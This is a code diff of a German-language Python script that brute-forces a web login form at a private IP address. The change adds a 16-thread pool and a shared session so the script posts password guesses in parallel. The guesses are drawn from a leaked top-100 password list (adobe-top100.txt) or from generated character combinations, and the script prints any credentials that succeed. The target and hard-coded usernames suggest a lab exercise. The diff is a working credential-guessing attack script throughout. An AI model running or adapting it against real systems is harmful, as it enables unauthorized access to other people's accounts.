@@ -1,11 +1,13 @@
 
 import itertools
 import requests
+from multiprocessing.dummy import Pool as ThreadPool
 
+pool = ThreadPool(16)
 user_input = input('Nutzername: ')
 user_array = ['bob', 'ute', 'paul']
 combination_array = []
-
+session = requests.Session()
 combined = []
 
 
@@ -34,7 +36,8 @@ def create_password(ingredients, length):
 def combine_profil(user_list, combination_list):
     for i in range(len(user_list)):
         for j in range(len(combination_list)):
-            combined.append('Profil ' + user_list[i] +' ' + str(j) + ' : ' + ''.join((combination_list[j])))
+            combined.append('Profil ' + user_list[i] +' ' + str(j) + ' : ' + ''.join(combination_list[j]))
+            print(''.join(combination_list[j]))
 
     with open('combination_list.txt', 'w') as filehandle:
         for listitem in combined:
@@ -44,58 +47,62 @@ def combine_profil(user_list, combination_list):
 url = 'http://172.50.1.5:8080/validate?'
 
 
-def execute_hack(user, combinations):
-    passwords = []
+def execute_hack(x):
 
-    if user == 'joe':
-        f = open('adobe-top100.txt', 'r')
+    combinations = combination_array
 
-        for line in f:
-            line = line.strip()
-            columns = line.split()
-            passwords.append(columns[3])
-
-        f.close()
-
-        for i in range(len(passwords)):
-            print('Versuchsnummer: ' + str(i))
-            data = {
-                'benutzername': user,
-                'passwort': passwords[i]
-            }
-            r = requests.post(url, data=data, stream=True)
-            if r.text != 'Benutzername oder Passwort falsch!':
-                print('Versuchsnummer: ' + str(i))
-                print(user + ' ' + passwords[i])
-                print(r.text)
-                break
+    if user_input == 'joe':
+        #print('Versuchsnummer: ' + str(x) + ' key: ' + passwords[x])
+        data = {
+            'benutzername': user_input,
+            'passwort': passwords[x]
+        }
+        r = session.post(url, data=data, stream=True)
+        if r.text != 'Benutzername oder Passwort falsch!':
+            print('Versuchsnummer: ' + str(x))
+            print(user_input + ' ' + passwords[x])
+            print(r.text)
 
     else:
-        for i in range(len(combinations)):
 
-            data = {
-                'benutzername': user,
-                'passwort': ''.join(combinations[i])
-            }
-            r = requests.post(url, data=data)
-            if r.text != 'Benutzername oder Passwort falsch!':
-                print('Versuchsnummer: ' + str(i))
-                print(user + ' ' + ''.join(combinations[i]))
-                print(r.text)
+        #print('Versuchsnummer: ' + str(x))
+        data = {
+            'benutzername': user_input,
+            'passwort': ''.join(combinations[x])
+        }
+        r = session.post(url, data=data, stream=True)
+        if r.text != 'Benutzername oder Passwort falsch!':
+            print('Versuchsnummer: ' + str(x))
+            print(user_input + ' ' + ''.join(combinations[x]))
+            print(r.text)
 
 
 if user_input != 'joe':
     password_length = int(input('Wie lang soll das Passwort sein? '))
     print('Ingredients: ' + create_ingredients())
     combination_array = create_password(create_ingredients(), password_length)
-    preparefortext = []
-    for i in range(len(combination_array)):
-        preparefortext.append(''.join(combination_array[i]))
+    #preparefortext = []
+    #for i in range(len(combination_array)):
+     #   preparefortext.append(''.join(combination_array[i]))
 
-    with open('combinations.txt', 'w') as filehandle:
-        for listitem in preparefortext:
-            filehandle.write(listitem + ',')
-    # combine_profil(user_array, combination_array)
+    #with open('combinations.txt', 'w') as filehandle:
+     #   for listitem in preparefortext:
+      #      filehandle.write(listitem + ',')
+    #combine_profil(user_array, combination_array)
 
 
-execute_hack(user_input, combination_array)
+#execute_hack(combination_array)
+passwords = []
+f = open('adobe-top100.txt', 'r')
+for line in f:
+    line = line.strip()
+    columns = line.split()
+    passwords.append(columns[3])
+
+f.close()
+
+results = pool.imap(execute_hack, range(3844))
+
+pool.close()
+pool.join()
+
